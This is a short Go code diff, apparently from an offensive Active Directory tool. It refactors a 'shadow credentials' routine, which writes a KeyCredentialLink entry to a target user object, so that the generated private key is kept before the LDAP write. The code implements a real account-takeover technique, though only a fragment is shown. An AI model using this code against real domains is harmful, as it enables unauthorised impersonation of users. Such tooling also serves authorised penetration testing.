@@ -113,14 +113,22 @@ func formatGUID(b []byte) string {
 		b[10:16])
 }
 
-// AddShadowCredential writes a new KeyCredentialLink entry to the target user object.
+// AddShadowCredential generates a new key credential and writes it to the target.
+// For callers that need to persist the key before the LDAP write, use
+// GenerateKeyCredential + AddShadowCredentialWithEntry instead.
 func AddShadowCredential(cfg *ADCSConfig, targetDN string) (*KeyCredentialEntry, error) {
-	fmt.Printf("[+] Shadow Credentials: Adding key to %s\n", targetDN)
-
 	entry, err := GenerateKeyCredential()
 	if err != nil {
 		return nil, fmt.Errorf("generate credential: %w", err)
 	}
+	return AddShadowCredentialWithEntry(cfg, targetDN, entry)
+}
+
+// AddShadowCredentialWithEntry writes a pre-generated KeyCredentialLink entry to
+// the target user object. This allows the caller to persist the private key
+// before the LDAP modify, preventing orphaned credentials on disk-write failure.
+func AddShadowCredentialWithEntry(cfg *ADCSConfig, targetDN string, entry *KeyCredentialEntry) (*KeyCredentialEntry, error) {
+	fmt.Printf("[+] Shadow Credentials: Adding key to %s\n", targetDN)
 
 	conn, err := connectLDAP(cfg)
 	if err != nil {
